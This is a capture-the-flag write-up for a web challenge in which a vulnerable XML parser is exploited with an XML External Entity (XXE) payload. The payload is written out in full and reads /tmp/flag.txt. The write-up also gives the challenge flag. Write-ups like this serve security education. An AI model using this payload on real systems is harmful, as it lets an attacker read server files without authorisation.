# XML Parser (Web) - Digital Defenders CTF 2023

## Description
> Oh, how delightful! You're just dying to receive some input to parse, aren't you? And the best part is, we never bother checking your inputs because, who needs safety precautions? So, here's a special treat just for you—a perfectly crafted server that will surely make your parsing adventure a thrilling rollercoaster ride. Don't fret about any potential risks or vulnerabilities. After all, why would anyone take advantage of such a glorious opportunity? So, go ahead and trust blindly as you delve into parsing this magical piece of data. Best of luck, dear friend, and may the parsing deities shower you with blessings!
>
> _The flag is in /tmp/flag.txt_

> **FLAG FORMAT:** bi0s{...}

## The Website
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/c89d8c25-eb2d-4c3c-876a-de93abb9f8d4)
The website has a textbox to enter XML in. On pressing submit, it parses the XML to display the output right there.
  
I wrote the following code to try it out
```XML
<?xml version="1.0"?>
    <change-log>
        <text>Hello World</text>
    </change-log>
```
  
On entering the above code and hitting "Submit", we get
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/fe2ae83c-6a2e-4520-93e0-f43fc23bb71f)

## Initial Takeaway
The challenge description made the goal very clear, to exploit XML External Entity Attack. The vulnerability this attack uses is parsing of XML code as is by a website.
So all I had to do was to craft an XML code to execute some command. The description also mentioned that the flag is located in `/tmp/flag.txt`. This made it clear that I had to execute a command to get the contents of `flag.txt`.
Another point to note down was that the website was using a POST request.

## Execution
I crafted the following XML code to execute my command
```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<foo>&xxe;</foo>
```
In simple words, it does exactly as I had planned earlier. The code gets the output of `flag.txt` and stores it in the variable `xxe`. Then it dereferences `xxe` to display the output on the screen the same way it displayed "Hello World".
So, I entered the code as decided and hit "Submit".
  
Et voilà
![image](https://github.com/ghost-1608/CTF-Write-Ups/assets/64543976/8487192e-7149-4757-b94f-632a1f54cc2a)

**(DISCLAIMER):** One thing to note is that according to the information released by the organisers, some CTF challenges use dynamic flags. Hence, the flag I solved the challenge with and the flag at the time of writing this write-up are different.
The method however remains the same.

**FLAG:** `bi0s{icsTXDzJJDiv6FeaNshGkw==}`
